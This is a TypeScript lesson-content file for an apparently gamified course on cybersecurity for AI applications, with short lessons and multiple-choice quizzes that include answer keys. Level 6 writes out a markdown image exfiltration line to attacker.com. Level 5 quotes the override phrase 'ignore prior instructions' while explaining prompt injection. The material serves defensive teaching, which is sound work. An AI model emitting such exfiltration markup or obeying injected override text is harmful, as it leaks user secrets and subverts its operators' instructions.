import type { Topic } from "../../types";
import { level, spark } from "../helpers";

const T = "cybersecurity" as const;

export const cybersecurity: Topic = {
  id: T,
  name: "Cybersecurity for AI",
  emoji: "🛡️",
  tagline: "Threats, defenses, and AI-specific attack surfaces.",
  color: "#ff5d8f",
  visual: "shield",
  levels: [
    level(T, 1, "Threat modeling 101", "Think like an attacker.", 4, [
      spark("STRIDE in 2 minutes", {
        type: "microread",
        title: "Six categories of threats",
        body: "STRIDE: Spoofing (pretending), Tampering (modifying), Repudiation (denying), Information disclosure, Denial of service, Elevation of privilege. Walk through each for any new feature. Even 10 minutes of STRIDE prevents 80% of avoidable bugs. AI features add three more: prompt injection, model poisoning, model theft.",
        takeaway: "STRIDE every feature. Add 3 AI-specific threats.",
        visual: "shield",
      }),
      spark("Quick check", {
        type: "quickpick",
        prompt: "User downloads your model file via an unsecured URL. Which STRIDE?",
        options: ["Spoofing", "Information disclosure", "Repudiation", "Denial of service"],
        answer: 1,
        explain: "Disclosure of intellectual property + potential model theft.",
      }),
    ]),
    level(T, 2, "Authentication basics", "Prove who you are.", 4, [
      spark("Passwords are dying", {
        type: "microread",
        title: "Use OAuth + MFA, always",
        body: "Don't roll your own auth. Use Google/GitHub OAuth, or services like Clerk/Auth0/Supabase. Enforce MFA for any admin access. Hash passwords (bcrypt/argon2) only if you absolutely must store them. Rotate API keys quarterly. Never commit secrets — use env vars and secret managers (1Password, AWS Secrets Manager).",
        takeaway: "Borrow auth from giants. MFA non-negotiable.",
        visual: "key",
      }),
      spark("Tip & Trick", {
        type: "tip",
        title: "💡 Tip & Trick",
        body: "Add a pre-commit hook with `git-secrets` or `gitleaks`. Catches API keys before they ever hit the repo. 60 seconds of setup, years of relief.",
      }),
    ]),
    level(T, 3, "OWASP top 10 for AI", "Quick tour.", 4, [
      spark("LLM top 10", {
        type: "microread",
        title: "OWASP LLM top 10",
        body: "Key items: prompt injection, insecure output handling, training data poisoning, model DoS, supply chain (compromised libs), sensitive info disclosure, insecure plugin design, excessive agency, overreliance, model theft. Read the full list once a quarter. It's the security checklist of AI.",
        takeaway: "OWASP LLM top 10 = your AI security checklist.",
      }),
      spark("Pattern match", {
        type: "patternmatch",
        prompt: "Match the attack to its category",
        pairs: [
          { left: "User input rewrites system prompt", right: "Prompt injection" },
          { left: "AI agent wires money without confirmation", right: "Excessive agency" },
          { left: "User gets back another user's data", right: "Sensitive info disclosure" },
          { left: "Model returns malicious HTML rendered by app", right: "Insecure output handling" },
        ],
        explain: "Each maps to a defensive pattern.",
      }),
    ]),
    level(T, 4, "Secrets & key hygiene", "Stop leaking creds.", 4, [
      spark("Three rules", {
        type: "microread",
        title: "Secrets discipline",
        body: "(1) Never in code. (2) Never in client-side code (browser, mobile bundle). (3) Rotate when in doubt. Keep API keys server-side; the browser calls your server, your server calls the LLM. Use scoped keys (per environment, per integration). When a key leaks (it will), you'll be glad you scoped it.",
        takeaway: "Server-side, scoped, rotated. No exceptions.",
      }),
      spark("Scenario", {
        type: "scenario",
        setup: "You shipped a React app that calls Anthropic's API directly with a hardcoded key.",
        prompt: "First action?",
        options: [
          "Wait and see",
          "Rotate the key immediately, move calls to a server proxy, scrub git history",
          "Hide the key with base64",
          "Email all users",
        ],
        answer: 1,
        explain: "Assume leaked. Rotate. Move server-side. Scrub.",
      }),
    ]),
    level(T, 5, "Prompt injection deep dive", "The #1 LLM attack.", 5, [
      spark("Direct vs indirect", {
        type: "microread",
        title: "Two flavors of prompt injection",
        body: "Direct: user types 'ignore prior instructions'. Indirect: hostile content lives in a webpage, doc, or email your AI reads. Indirect is scarier — your trusted-looking input has booby traps. Defenses: clear input boundaries, dual-LLM 'reviewer' pass, never give the same model both privileged tools and untrusted content.",
        takeaway: "Indirect injection > direct. Treat all inputs as hostile.",
        visual: "shield",
      }),
      spark("Tip & Trick", {
        type: "tip",
        title: "💡 Tip & Trick",
        body: "If your agent reads emails AND can send emails, that's a recipe for indirect injection. Split: a 'reader' LLM with no tools, then a 'writer' LLM that sees only sanitized summaries.",
      }),
    ]),
    level(T, 6, "Data exfiltration via AI", "Stealthy outflows.", 4, [
      spark("Markdown image trick", {
        type: "microread",
        title: "Why markdown images are dangerous",
        body: "If your AI can render markdown and output `![](https://attacker.com/log?data=secrets)`, the browser fetches that URL and leaks data. Same with hyperlinks the user clicks. Sanitize all model outputs before rendering. Strip image tags from untrusted-source AI replies. CSP can also block external image loads.",
        takeaway: "Sanitize AI HTML/markdown. CSP your renderers.",
      }),
    ]),
    level(T, 7, "Logging without leaking", "Observability with restraint.", 4, [
      spark("Log smart", {
        type: "microread",
        title: "What to log, what to redact",
        body: "Log: timestamps, latency, token counts, model IDs, prompt/response IDs, error codes. Redact: emails, names, IDs, payment info, free-text user input by default. Use a redactor (Presidio, Microsoft Purview) on every log writer. Sample full traces only with explicit consent for debugging.",
        takeaway: "Log enough to debug. Redact everything personal.",
      }),
      spark("Tip & Trick", {
        type: "tip",
        title: "💡 Tip & Trick",
        body: "Tag every log line with tenant_id and request_id. When the inevitable 'why did this happen' comes, you can trace without scanning everyone's data.",
      }),
    ]),
    level(T, 8, "Supply chain risks", "Your deps are your attack surface.", 4, [
      spark("Pin and verify", {
        type: "microread",
        title: "Pin everything",
        body: "AI codebases pull in ML libs, model weights, datasets. Each is a supply chain risk. Pin versions (no ^ ranges in prod), verify checksums for model downloads, audit your dependency tree quarterly with `npm audit` / `pip-audit` / `osv-scanner`. Beware lookalike package names — `tensorflow` vs `tensorflowg`.",
        takeaway: "Pin versions, verify hashes, scan deps.",
      }),
    ]),
    level(T, 9, "Incident response", "When (not if) it happens.", 4, [
      spark("Playbook", {
        type: "microread",
        title: "Have a 30-min playbook",
        body: "Write down: who declares incident, where you communicate (Slack channel), how to rotate keys, how to revoke sessions, who emails users. Practice quarterly. The middle of an incident is the worst time to write the playbook. Real ones: 30 min from detection to containment.",
        takeaway: "Pre-write the playbook. Drill it quarterly.",
      }),
    ]),
    level(T, 10, "Boss: security check", "Final gate.", 6, [
      spark("Boss Cell", {
        type: "boss",
        title: "Boss: Cybersecurity",
        questions: [
          {
            type: "quickpick",
            prompt: "Best defense against indirect prompt injection?",
            options: ["Hope", "Split untrusted-reader from privileged-actor LLMs", "Bigger model", "Yelling at the prompt"],
            answer: 1,
            explain: "Architecture > prayers.",
          },
          {
            type: "quickpick",
            prompt: "API key in a public repo. First action?",
            options: ["Edit the file silently", "Rotate the key immediately, then scrub", "DM the leaker", "Open an issue"],
            answer: 1,
            explain: "Assume compromised. Rotate first, cleanup second.",
          },
          {
            type: "quickpick",
            prompt: "What never goes in client-side code?",
            options: ["UI text", "API keys / secrets", "Component names", "Comments"],
            answer: 1,
            explain: "Server-side only. Always.",
          },
        ],
      }),
    ]),
  ],
};
